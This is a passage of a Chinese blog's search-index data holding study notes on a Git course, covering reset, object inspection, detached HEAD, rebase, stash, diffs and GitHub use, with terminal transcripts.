20190403.md100644 b302937d18a748f0e071c2c42712d2b18b0eeb1a 0 readme.mdMacBook-Pro-4:git_le booboo$ git reset --soft f5634fdMacBook-Pro-4:git_le booboo$ git log --oneline -n4f5634fd (HEAD -&gt; master) modify 20190406f223b4d add 20190403.mdc4744d9 add readme.mdMacBook-Pro-4:git_le booboo$ git ls-files --stage100644 ce013625030ba8dba906f756967f9e9ca394464a 0 20190403.md100644 b302937d18a748f0e071c2c42712d2b18b0eeb1a 0 readme.md 我们可以看到指针变化，不会修改索引信息。 git reset --soft命令修改指针实现回退或重演功能。 git cat-file命令 命令 功能 git cat-file 显示版本库对象的内容、类型及大小信息。 git cat-file -t b44dd71d62a5a8ed3 显示版本库对象的类型 git cat-file -s b44dd71d62a5a8ed3 显示版本库对象的大小 git cat-file -p b44dd71d62a5a8ed3 显示版本库对象的内容 什么是指纹？ 时刻保持数据完整性 在保存到 Git 之前，所有数据都要进行内容的校验和（checksum）计算，并将此结果作为数据的唯一标识和索引。换句话说，不可能在你修改了文件或目录之后，Git 一无所知。这项特性作为 Git 的设计哲学，建在整体架构的最底层。所以如果文件在传输时变得不完整，或者磁盘损坏导致文件数据缺失，Git 都能立即察觉。 Git 使用 SHA-1 算法计算数据的校验和，通过对文件的内容或目录的结构计算出一个 SHA-1 哈希值，作为指纹字符串。该字串由 40 个十六进制字符（0-9 及 a-f）组成，看起来就像是： 124b9da6552252987aa493b52f8696cd6d3b00373 Git 的工作完全依赖于这类指纹字串，所以你会经常看到这样的哈希值。实际上，所有保存在 Git 数据库中的东西都是用此哈希值来作索引的，而不是靠文件名。","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/09_%E6%8E%A2%E5%AF%86.git%E7%9B%AE%E5%BD%95/"},{"title":"玩转Git三剑客学习笔记-第08课-gitk通过图形化工具查看版本历史","text":"gitk通过图形化工具查看版本历史 gitk问题总结 gitk通过图形化工具查看版本历史1gitk通过该命令调用图形化界面，但是貌似不是很高清（Mac环境）。 gitk问题总结 gitk 后面可以跟上文件的路径，这样能看单个文件的修改历史的具体内容，非常有用； 似乎 gitk 对 utf-8 编码的中文字符支持存在一定的问题，在我的 IDE 上将中文注释全都变成乱码了； 推荐 gitkarken、sourcetree、tower 等等图形化工具； Mac 上升级自带版本的 Git 的方式，可以参考 StackOverFlow 上的这个问题：https://stackoverflow.com/questions/8957862/how-to-upgrade-git-to-latest-version-on-os-x","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/08_gitk_%E9%80%9A%E8%BF%87%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%E5%8E%86%E5%8F%B2/"},{"title":"玩转Git三剑客学习笔记-第07课-通过git log 查看版本演变历史","text":"通过git log 查看版本演变历史 简洁的查看 查看最近的几次 课堂练习 基础命令git log 帮助 通过git log 查看版本演变历史简洁的查看1git log --oneline并非字面意义的一行，而是打印11行 查看最近的几次1git log -n4 --oneline-n4 代表只打印4行 课堂练习 查看版本演变历史，只查看最近的3次 根据其中一次版本编号，创建分支temp 修改temp分支中的文件，并提交 查看temp分支的版本演变历史 查看所有分支的版本演变历史 通过图形化方式查看所有分支的版本演变历史 切换到master分支，查看tmp分支的版本演变历史 12345678910git log -n3 --onelinegit checkout -b temp xxxadd temp.txtgit add -Agit commit -m &apos;add temp.txt&apos;git loggit log --all --oneline -n3git log --all --graph --oneline -n3git checkout mastergit log --online -n3 temp 基础命令git log帮助1git help log","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/07_%E9%80%9A%E8%BF%87git_log%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%E6%BC%94%E5%8F%98%E5%8E%86%E5%8F%B2/"},{"title":"玩转Git三剑客学习笔记-第13课-进一步理解HEAD和branch","text":"进一步理解HEAD和branch HEAD 最终一定是指向 commit; git diff HEAD HEAD^1^1将当前分支和爷爷对比。 练习题创建两个不同的 Git 仓库，在⾥⾯添加相同内容的⽂件，然后把 它们都加⼊到暂存区中，再看看两个仓库中同内容的⽂件对应的 blob 的 hash 值是否相同？多试⼏次看看结论是否⼀样？ 一样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152MacBook-Pro-4:booboo booboo$ cd test_git/MacBook-Pro-4:test_git booboo$ git init 01Initialized empty Git repository in /Users/booboo/Desktop/booboo/test_git/01/.git/MacBook-Pro-4:test_git booboo$ git init 02Initialized empty Git repository in /Users/booboo/Desktop/booboo/test_git/02/.git/MacBook-Pro-4:test_git booboo$ cd 01MacBook-Pro-4:01 booboo$ echo 01 &gt; 01.mdMacBook-Pro-4:01 booboo$ git add -AMacBook-Pro-4:01 booboo$ git commit -m &apos;01&apos;[master (root-commit) 55ed5b6] 01 1 file changed, 1 insertion(+) create mode 100644 01.mdMacBook-Pro-4:01 booboo$ cd ..MacBook-Pro-4:test_git booboo$ cd 02MacBook-Pro-4:02 booboo$ echo 02 &gt; 02.mdMacBook-Pro-4:02 booboo$ rm -rf 02.md MacBook-Pro-4:02 booboo$ lsMacBook-Pro-4:02 booboo$ echo 01 &gt; 01.mdMacBook-Pro-4:02 booboo$ git add -AMacBook-Pro-4:02 booboo$ git commit -m &apos;01&apos;[master (root-commit) 822cf01] 01 1 file changed, 1 insertion(+) create mode 100644 01.mdMacBook-Pro-4:02 booboo$ cd ..MacBook-Pro-4:test_git booboo$ ls01 02MacBook-Pro-4:test_git booboo$ cd 01MacBook-Pro-4:01 booboo$ git log --oneline -n255ed5b6 (HEAD -&gt; master) 01MacBook-Pro-4:01 booboo$ git cat-file -p 55ed5b6tree e490984a8d69d6c74ac8749fbcfd9e0571fa3453author weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554990843 +0800committer weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554990843 +080001MacBook-Pro-4:01 booboo$ git cat-file -p e4909100644 blob 8a0f05e166aa61225bf6649cb345f87416b5f509 01.mdMacBook-Pro-4:01 booboo$ git cat-file -p 8a0f01MacBook-Pro-4:01 booboo$ cd ../02MacBook-Pro-4:02 booboo$ git log --oneline -n2822cf01 (HEAD -&gt; master) 01MacBook-Pro-4:02 booboo$ git cat-file -p 822cf01tree e490984a8d69d6c74ac8749fbcfd9e0571fa3453author weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554990882 +0800committer weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554990882 +080001MacBook-Pro-4:02 booboo$ git cat-file -p e4909100644 blob 8a0f05e166aa61225bf6649cb345f87416b5f509 01.mdMacBook-Pro-4:02 booboo$ git cat-file -p 8a0f01","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/13_%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%90%86%E8%A7%A3HEAD%E5%92%8Cbranch/"},{"title":"玩转Git三剑客学习笔记-第10课-commit、tree和blob三个对象之间的关系","text":"[TOC] commit、tree和blob三个对象之间的关系 查看git日志，选择一个commit； 1234MacBook-Pro-4:git_le booboo$ git log --oneline -n3f5634fd (HEAD -&gt; master) modify 20190406f223b4d add 20190403.mdc4744d9 add readme.md 通过commit查看tree； MacBook-Pro-4:git_le booboo$ git cat-file -p c4744d9 tree 6f47cef9a80991888e82e73aa5b78f7a784f345e author weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554261524 +0800 committer weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554261524 +0800 add readme.md 125. 通过blob查看文件内容。 总结","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/10_commit%E3%80%81tree%E5%92%8Cblob%E4%B8%89%E4%B8%AA%E5%AF%B9%E8%B1%A1%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"},{"title":"玩转Git三剑客学习笔记-第11课-小练习_数一数tree的个数","text":"小练习_数一数tree的个数 12345678910111213141516171819202122232425262728MacBook-Pro-4:booboo booboo$ git init git-02Initialized empty Git repository in /Users/booboo/Desktop/booboo/git-02/.git/MacBook-Pro-4:booboo booboo$ cd git-02MacBook-Pro-4:git-02 booboo$ mkdir docMacBook-Pro-4:git-02 booboo$ echo doc-test &gt; doc/reamdeMacBook-Pro-4:git-02 booboo$ git add doc/reamde MacBook-Pro-4:git-02 booboo$ git commit -m &apos;new commit&apos;[master (root-commit) 8e42ad7] new commit 1 file changed, 1 insertion(+) create mode 100644 doc/reamdeMacBook-Pro-4:git-02 booboo$ git logcommit 8e42ad75ce3c4ff53aade034168c51c2aaff7d41 (HEAD -&gt; master)Author: weiyaping &lt;weiyaping@jiagouyun.com&gt;Date: Thu Apr 11 21:25:30 2019 +0800 new commitMacBook-Pro-4:git-02 booboo$ git cat-file -p 8e42ad75ce3ctree ba6c17b4b5c3cdc481e1c8a18bbf50cfd0e5c597author weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554989130 +0800committer weiyaping &lt;weiyaping@jiagouyun.com&gt; 1554989130 +0800new commitMacBook-Pro-4:git-02 booboo$ git cat-file -p ba6c17b4040000 tree 025501607b324923e813dbdaf2b4be564b817811 docMacBook-Pro-4:git-02 booboo$ git cat-file -p 02550160100644 blob 017ed3172ed19828d91b55075785a94badf14f3e reamdeMacBook-Pro-4:git-02 booboo$ git cat-file -p 017ed3172edoc-test 过程 commit tree tree blob 哈希值 8e42 ba6c 0255 017e 说明 提交的唯一id 提交doc目录的id 提交readme文件的id readme的文件id","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/11_%E5%B0%8F%E7%BB%83%E4%B9%A0_%E6%95%B0%E4%B8%80%E6%95%B0tree%E7%9A%84%E4%B8%AA%E6%95%B0/"},{"title":"玩转Git三剑客学习笔记-第12课-分离头指针情况下的注意事项","text":"分离头指针情况下的注意事项好的用处如果临时想基于某个commit做变更，试试新方案是否可行，就可以采用分离头指针的方式。测试后发现新方案不成熟，直接reset回其他分支即可。省去了建、删分支的麻烦。 查看当前git提交的日志明细； 1234567MacBook-Pro-4:git_le booboo$ git log --oneline b4355e3 (HEAD -&gt; master) add a.md&amp;b.mdf5634fd modify 20190406f223b4d add 20190403.mdc4744d9 add readme.mdMacBook-Pro-4:git_le booboo$ cat readme.md le 想在c4744d9的版本上测试某个修改动作； 12345678910111213MacBook-Pro-4:git_le booboo$ git checkout c4744d9Note: checking out &apos;c4744d9&apos;.You are in &apos;detached HEAD&apos; state. You can look around, make experimentalchanges and commit them, and you can discard any commits you make in thisstate without impacting any branches by performing another checkout.If you want to create a new branch to retain commits you create, you maydo so (now or later) by using -b with the checkout command again. Example: git checkout -b &lt;new-branch-name&gt;HEAD is now at c4744d9 add readme.md git提醒我们当前处于”detached HEAD”，即”分离头指针”的状态；HEAD当前指向c4744d9； 修改文件readme.md； 1MacBook-Pro-4:git_le booboo$ echo &quot;detached HEAD&quot; &gt; readme.md 提交更改，并查看分支明细； 123456789101112MacBook-Pro-4:git_le booboo$ git branch -av* (HEAD detached at c4744d9) c4744d9 add readme.md master b4355e3 add a.md&amp;b.md temp 49c201f temp_testMacBook-Pro-4:git_le booboo$ git add -AMacBook-Pro-4:git_le booboo$ git commit -m &apos;de&apos;[detached HEAD 80718ad] de 1 file changed, 1 insertion(+), 1 deletion(-) MacBook-Pro-4:git_le booboo$ git branch -av* (HEAD detached from c4744d9) 80718ad de master b4355e3 add a.md&amp;b.md temp 49c201f temp_test 此时需要切换到主分支； 123456789101112MacBook-Pro-4:git_le booboo$ git checkout masterWarning: you are leaving 1 commit behind, not connected toany of your branches: 80718ad deIf you want to keep it by creating a new branch, this may be a good timeto do so with: git branch &lt;new-branch-name&gt; 80718adSwitched to branch &apos;master&apos; 切换到master分支后，git提醒说可以通过命令git branch &lt;new-branch-name&gt; 80718ad创建一个分支，保存刚才的数据。 刚才测试的内容需要保存，则创建一个分支，否则不创建就丢弃了。 12345MacBook-Pro-4:git_le booboo$ git branch de 80718adMacBook-Pro-4:git_le booboo$ git branch -av de 80718ad de* master b4355e3 add a.md&amp;b.md temp 49c201f temp_test 坏的情况","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/12_%E5%88%86%E7%A6%BB%E5%A4%B4%E6%8C%87%E9%92%88%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"},{"title":"玩转Git三剑客学习笔记-第17课-怎么把连续的多个commit整理成1个","text":"git branch -d branch_name 使用-d在删除前Git会判断在该分支上开发的功能是否被merge的其它分支。如果没有会报“error：The branch is not fully merged”的错误，不能删除。 在日常开发中，我们通常赋予有意义的分支名，Git判断本分支没和任何别的分支合并，意味这删除存在风险。它也提供我们-D的方式，如果确定无风险就用-D 。","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/14_%E6%80%8E%E4%B9%88%E5%88%A0%E9%99%A4%E4%B8%8D%E9%9C%80%E8%A6%81%E7%9A%84%E5%88%86%E6%94%AF/"},{"title":"玩转Git三剑客学习笔记-第15课-怎么修改最新commit和message","text":"如果刚刚commit时编写的message不准确需要修改 1git commit --amend","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/15_%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%E6%9C%80%E6%96%B0commit%E5%92%8Cmessage/"},{"title":"玩转Git三剑客学习笔记-第16课-怎么修改老旧commit和message","text":"1git rebase -i commit_id","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/16_%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%E8%80%81%E6%97%A7commit%E5%92%8Cmessage/"},{"title":"玩转Git三剑客学习笔记-第13课-进一步理解HEAD和branch","text":"怎么把连续的多个commit整理成1个1`git rebase -i commit_father_id`","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/17_%E6%80%8E%E4%B9%88%E6%8A%8A%E8%BF%9E%E7%BB%AD%E7%9A%84%E5%A4%9A%E4%B8%AAcommit%E6%95%B4%E7%90%86%E6%88%901%E4%B8%AA/"},{"title":"玩转Git三剑客学习笔记-第19课-怎么比较暂存区和HEAD所含文件的差异","text":"12345678910111213141516171819202122232425262728293031MacBook-Pro-4:DBA_Git booboo$ git statusOn branch masterYour branch is up to date with &apos;origin/master&apos;.nothing to commit, working tree cleanMacBook-Pro-4:DBA_Git booboo$ git diff --cachedMacBook-Pro-4:DBA_Git booboo$ git add *MacBook-Pro-4:DBA_Git booboo$ git statusOn branch masterYour branch is up to date with &apos;origin/master&apos;.Changes to be committed: (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage) modified: Chapter02_CommonScenariosUsedAlone/17_怎么把连续的多个commit整理成1个.md modified: Chapter02_CommonScenariosUsedAlone/18_怎么把间隔的几个commit整理成1个.md modified: Chapter02_CommonScenariosUsedAlone/readme.mdMacBook-Pro-4:DBA_Git booboo$ git diff --cacheddiff --git a/Chapter02_CommonScenariosUsedAlone/17_怎么把连续的多个commit整理成1个.md b/Chapter02_CommonScenariosUsedAlone/17_怎么把连续的多个commit整理成1个.mdindex e69de29..98e36eb 100644--- a/Chapter02_CommonScenariosUsedAlone/17_怎么把连续的多个commit整理成1个.md+++ b/Chapter02_CommonScenariosUsedAlone/17_怎么把连续的多个commit整理成1个.md@@ -0,0 +1,7 @@+[toc]++# 怎么把连续的多个commit整理成1个++```shell+`git rebase -i commit_father_id`+diff –git a/Chapter02_CommonScenariosUsedAlone/18_怎么把间隔的几个commit整理成1个.md b/Chapter02_CommonScenariosUsedAlone/18_怎么把间隔的几个commit整理成1个.mdindex e69de29..56854c1 100644— a/Chapter02_CommonScenariosUsedAlone/18_怎么把间隔的几个commit整理成1个.md+++ b/Chapter02_CommonScenariosUsedAlone/18_怎么把间隔的几个commit整理成1个.md@@ -0,0 +1,7 @@+[toc]++# 怎么把间隔的几个commit整理成1个++shell +git rebase -i commit_father_id +diff –git a/Chapter02_CommonScenariosUsedAlone/readme.md b/Chapter02_CommonScenariosUsedAlone/readme.mdindex e2d0f86..c907b2d 100644— a/Chapter02_CommonScenariosUsedAlone/readme.md+++ b/Chapter02_CommonScenariosUsedAlone/readme.md@@ -2,7 +2,7 @@ |:–|:–|:–| |1|怎么删除不需要的分支|git brach -d branch_name| |2|怎么修改最新commit和message|git commit --amend|-|3|怎么修改老旧commit和message|git rebase -i commit_id|+|3|怎么修改老旧commit和message|git rebase -i commit_father_id| |4|怎么把连续的多个commit整理成1个|| |5|怎么把间隔的几个commit整理成1个|| |6|怎么比较暂存区和HEAD所含文件的差异||","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/19_%E6%80%8E%E4%B9%88%E6%AF%94%E8%BE%83%E6%9A%82%E5%AD%98%E5%8C%BA%E5%92%8CHEAD%E6%89%80%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E5%B7%AE%E5%BC%82/"},{"title":"玩转Git三剑客学习笔记-第20课-怎么比较工作区和暂存区所含文件的差异","text":"HEAD 上一次commit的内容，例如\breadme.md文件中存放1 暂存区 编辑了readme.md,现在文件中存放12并\b执行了git add readme.md 工作区 \b继续编辑readme.md,现在文件中存放123 123456789101112131415161718192021222324MacBook-Pro-4:git_01 booboo$ vim readme.mdMacBook-Pro-4:git_01 booboo$ git add readme.mdMacBook-Pro-4:git_01 booboo$ git commit -m &apos;add 1&apos;[master a95d9b6] add 1 1 file changed, 1 insertion(+), 1 deletion(-)MacBook-Pro-4:git_01 booboo$ vim readme.mdMacBook-Pro-4:git_01 booboo$ git add readme.mdMacBook-Pro-4:git_01 booboo$ git diff --cacheddiff --git a/readme.md b/readme.mdindex d00491f..48082f7 100644--- a/readme.md+++ b/readme.md@@ -1 +1 @@-1+12MacBook-Pro-4:git_01 booboo$ vim readme.mdMacBook-Pro-4:git_01 booboo$ git diffdiff --git a/readme.md b/readme.mdindex 48082f7..190a180 100644--- a/readme.md+++ b/readme.md@@ -1 +1 @@-12+123","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/20_%E6%80%8E%E4%B9%88%E6%AF%94%E8%BE%83%E5%B7%A5%E4%BD%9C%E5%8C%BA%E5%92%8C%E6%9A%82%E5%AD%98%E5%8C%BA%E6%89%80%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E5%B7%AE%E5%BC%82/"},{"title":"玩转Git三剑客学习笔记-第18课-怎么把间隔的几个commit整理成1个","text":"1git rebase -i commit_father_id","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/18_%E6%80%8E%E4%B9%88%E6%8A%8A%E9%97%B4%E9%9A%94%E7%9A%84%E5%87%A0%E4%B8%AAcommit%E6%95%B4%E7%90%86%E6%88%901%E4%B8%AA/"},{"title":"玩转Git三剑客学习笔记-第21课-如何让暂存区恢复和HEAD的一样","text":"放弃\b已经add的内容 1git reset HEAD git reset 有三个参数 –soft 这个只是把 HEAD 指向的 commit 恢复到你指定的 commit，暂存区 工作区不变 –hard 这个是 把 HEAD， 暂存区， 工作区 都修改为 你指定的 commit 的时候的文件状态 –mixed 这个是不加时候的默认参数，把 HEAD，暂存区 修改为 你指定的 commit 的时候的文件状态，工作区保持不变","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/21_%E5%A6%82%E4%BD%95%E8%AE%A9%E6%9A%82%E5%AD%98%E5%8C%BA%E6%81%A2%E5%A4%8D%E5%92%8CHEAD%E7%9A%84%E4%B8%80%E6%A0%B7/"},{"title":"玩转Git三剑客学习笔记-第22课-如何让工作区的文件恢复为和暂存区一样","text":"1234567暂存区与HEAD比较：git diff --cached暂存区与工作区比较: git diff暂存区恢复成HEAD : git reset HEAD暂存区覆盖工作区修改：git checkout","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/22_%E5%A6%82%E4%BD%95%E8%AE%A9%E5%B7%A5%E4%BD%9C%E5%8C%BA%E7%9A%84%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E4%B8%BA%E5%92%8C%E6%9A%82%E5%AD%98%E5%8C%BA%E4%B8%80%E6%A0%B7/"},{"title":"玩转Git三剑客学习笔记-第23课-怎么消除暂存区部分文件的修改","text":"怎么消除暂存区部分文件的修改1git reset HEAD -- file1 file2","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/23_%E6%80%8E%E4%B9%88%E6%B6%88%E9%99%A4%E6%9A%82%E5%AD%98%E5%8C%BA%E9%83%A8%E5%88%86%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E6%94%B9/"},{"title":"玩转Git三剑客学习笔记-第24课-消除最近的几次提交","text":"12345修改了工作区，恢复：git checkoutadd后，想撤销： git reset HEADcommit后，想撤销： git reset--hard hash值","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/24_%E6%B6%88%E9%99%A4%E6%9C%80%E8%BF%91%E7%9A%84%E5%87%A0%E6%AC%A1%E6%8F%90%E4%BA%A4/"},{"title":"玩转Git三剑客学习笔记-第25课-看看不同提交的指定文件的差异","text":"1git diff commit-id1 commit-id2 path-to-filename","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/25_%E7%9C%8B%E7%9C%8B%E4%B8%8D%E5%90%8C%E6%8F%90%E4%BA%A4%E7%9A%84%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E5%B7%AE%E5%BC%82/"},{"title":"玩转Git三剑客学习笔记-第26课-正确删除文件的方法","text":"1git rm file","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/26_%E6%AD%A3%E7%A1%AE%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"玩转Git三剑客学习笔记-第27课-开发中临时加塞了紧急任务怎么处理","text":"场景：\b正在开发新功能，但是测试说之前已经提交的代码出现了bug需要紧急修复。 此时可以先通过stach将当前工作区的内容存到别处，将工作区清空；接着修复bug，提交后；再将\b之前工作区的内容apply拿回来。 12345678910111213git stachgit stash listgit statusgit stach applygit stach listgit statch popgit reset --hard HEADgit statusgit statch popgit stach list apply:会保留stach pop\b：会删除","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/27_%E5%BC%80%E5%8F%91%E4%B8%AD%E4%B8%B4%E6%97%B6%E5%8A%A0%E5%A1%9E%E4%BA%86%E7%B4%A7%E6%80%A5%E4%BB%BB%E5%8A%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/"},{"title":"玩转Git三剑客学习笔记-第28课-如何指定不需要Git管理的文件","text":"一些example https://github.com/github/gitignore 1touch .gitignore doc: 文件或该目录下的所有文件都忽略","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/28_%E5%A6%82%E4%BD%95%E6%8C%87%E5%AE%9A%E4%B8%8D%E9%9C%80%E8%A6%81Git%E7%AE%A1%E7%90%86%E7%9A%84%E6%96%87%E4%BB%B6/"},{"title":"玩转Git三剑客学习笔记-第29课-如何将Git仓库备份到本地","text":"哑协议 VS 智能协议 直观区别： 哑协议传输速度不可见、智能协议传输协议可见 传输速度：智能协议比哑协议传输速度块 12345678mkdir backup_dircd backup_dirgit clone --bare file://\b[local_path] [backup_name]cd git_dirgit remote add backup_name file://\b[local_path]git push --set-upstream backup_name master","link":"/2019/05/12/DBA_Git/Chapter02_CommonScenariosUsedAlone/29_%E5%A6%82%E4%BD%95%E5%B0%86Git%E4%BB%93%E5%BA%93%E5%A4%87%E4%BB%BD%E5%88%B0%E6%9C%AC%E5%9C%B0/"},{"title":"玩转Git三剑客学习笔记-第39~40课-Git集成使用禁忌","text":"编号 课程 39 禁止向集成分支执行push -f操作 40 禁止向集成分支执行变更历史的操作","link":"/2019/05/12/DBA_Git/Chapter05_TaboosForGitIntegration/readme/"},{"title":"玩转Git三剑客学习笔记-第13课-进一步理解HEAD和branch","text":"Git多人单分支集成协作时的常见场景 编号 课程 备注 34 不同人修改了不同文件如何处理？ 35 不同人修改了同文件的不同区域如何处理？ 36 不同人修改了同文件的同一区域如何处理？ 37 同时变更了文件名和文件内容如何处理？ 38 把同一文件改成了不同的文件名如何处理？","link":"/2019/05/12/DBA_Git/Chapter04_CommonScenariosForGitMulti-personSingle-branchIntegratedCollaboration/readme/"},{"title":"玩转Git三剑客学习笔记-第30~33课-Git与GitHub的简单同步","text":"Git与GitHub的简单同步 课程 内容 备注 30 注册一个GitHub账号 https://github.com/ 31 配置公私钥 https://help.github.com/cn 32 在GitHub上创建个人仓库 https://help.github.com/cn 33 把本地仓库同步到GitHub https://help.github.com/cn 123456git remote -v 查看远程版本库信息git remote add github &lt;url&gt; 添加github远程版本库git fetch github 拉取远程版本库git merge -h 查看合并帮助信息git merge --allow-unrelated-histories github/master 合并github上的master分支（两分支不是父子关系，所以合并需要添加 --allow-unrelated-histories）git push github 推送同步到githup仓库","link":"/2019/05/12/DBA_Git/Chapter03_GitSyncWithGitHub/readme/"},{"title":"玩转Git三剑客学习笔记-第41课-GitHub为什么会火？","text":"GitHub为什么会火？","link":"/2019/05/12/DBA_Git/Chapter06_FirstAcquaintanceGitHub/41_GitHub%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E7%81%AB/"},{"title":"玩转Git三剑客学习笔记-第42课-GitHub都有哪些核心功能","text":"features Code ReviewCode Review主要分两类： 一个就是技术专家人工review； 第二个就是借助程序自动检查代码。 在 GitHub上大家可以到Market Place找找质量相关的app，比如代码静态检查等app，让它在pull request的时候发挥作用，帮助团队做review。 Project Management项目管理工具可以跟踪和分配任务。 Integrations集成工具，例如我常用的atom、PyCharm。 Team Management 管理和发展团队 制定团队准则 Social coding拥有3600万开发人员的社区，有很多机会可以与志同道合的开发人员一起创建项目。 Documentation在GitHub上，您可以创建维护良好的文档，并确保他们获得应有的高水平关怀。 GitHub页面 维基 Code HostingGitHub是世界上最大的代码主机之一，拥有超过1亿个+项目。私有，公共或开源，所有存储库都配备了帮助您托管，版本和发布代码的工具。","link":"/2019/05/12/DBA_Git/Chapter06_FirstAcquaintanceGitHub/42_GitHub%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD/"},{"title":"玩转Git三剑客学习笔记-第43课-怎么快速淘到感兴趣的开源项目","text":"一般搜索直接在搜索框中填写关键字 例如：查找python相关的项目 高级搜索高级搜索URL 1python stars:&gt;1000 forks:50..1000 language:Python 无结果 1python stars:&gt;1000 搜索的结果减少至1000左右。 注意：高级搜索功能显示code需要登陆才能使用","link":"/2019/05/12/DBA_Git/Chapter06_FirstAcquaintanceGitHub/43_%E6%80%8E%E4%B9%88%E5%BF%AB%E9%80%9F%E6%B7%98%E5%88%B0%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"},{"title":"玩转Git三剑客学习笔记-第45课-开源项目怎么保证代码质量","text":"如何向开源项目提交request？ 案例1-向InfluxData/telegraf开源项目提交PR 访问telegraf项目的Readme，获取该项目的PR要求 Readme 访问贡献步骤 贡献步骤 12345678910Contributing* Sign the CLA.* Open a new issue to discuss the changes you would like to make. This is not strictly required but it may help reduce the amount of rework you need to do later.Make changes or write plugin using the guidelines in the following documents:* Input Plugins* Processor Plugins* Aggregator Plugins* Output Plugins* Ensure you have added proper unit tests and documentation.* Open a new pull request. 我的PR 增强inputs.mysql以收集更多锁定信息＃6080","link":"/2019/05/12/DBA_Git/Chapter06_FirstAcquaintanceGitHub/45_%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E4%BB%A3%E7%A0%81%E8%B4%A8%E9%87%8F/"},{"title":"玩转Git三剑客学习笔记-第44课-怎样在GitHub上搭建个人博客","text":"怎样在GitHub上搭建个人博客Hexo搭建markdown博客","link":"/2019/05/12/DBA_Git/Chapter06_FirstAcquaintanceGitHub/44_%E6%80%8E%E6%A0%B7%E5%9C%A8GitHub%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"玩转Git三剑客学习笔记-第46课-为何需要组织类型的仓库","text":"待补充","link":"/2019/05/12/DBA_Git/Chapter06_FirstAcquaintanceGitHub/46_%E4%B8%BA%E4%BD%95%E9%9C%80%E8%A6%81%E7%BB%84%E7%BB%87%E7%B1%BB%E5%9E%8B%E7%9A%84%E4%BB%93%E5%BA%93/"},{"title":"玩转Git三剑客学习笔记-第47～56课-使用GitHub进行团队协作","text":"编号 课程 47 创建团队的项目 48 怎样选择适合自己团队的工作流？ 49 如何挑选合适的分支集成策略？ 50 启用issue跟踪需求和任务 51 如何用project管理issue？ 52 项目内部怎么实施code review？ 53 团队协作时如何做多分支的集成？ 54 怎样保证集成的质量？ 55 怎样把产品包发布到GitHub上？ 56 怎么给项目增加详细的指导文档？","link":"/2019/05/12/DBA_Git/Chapter07_TeamCollaborationUsingGitHub/readme/"},{"title":"玩转Git三剑客学习笔记-第57～62课-GitLab实践","text":"编号 课程 57 国内互联网企业为什么喜欢GitLab？ 58 GitLab有哪些核心的功能？ 59 GitLab上怎么做项目管理？ 60 GitLab上怎么做code review？ 61 GitLab上怎么保证集成的质量？ 62 怎么把应用部署到AWS上？","link":"/2019/05/12/DBA_Git/Chapter08_GitLabPractice/readme/"},{"title":"Git版本控制","text":"版本控制的历史及作用 GIT的安装 GIT的初始化 第一次提交文件 GIT的工作区、暂存区、版本库 GIT的常用基本命令 GIT分支 GIT克隆 9.GITHUB的使用 Git是一个免费的开源 分布式版本控制系统，旨在快速高效地处理从小型到大型项目的所有内容。 Git 易于学习， 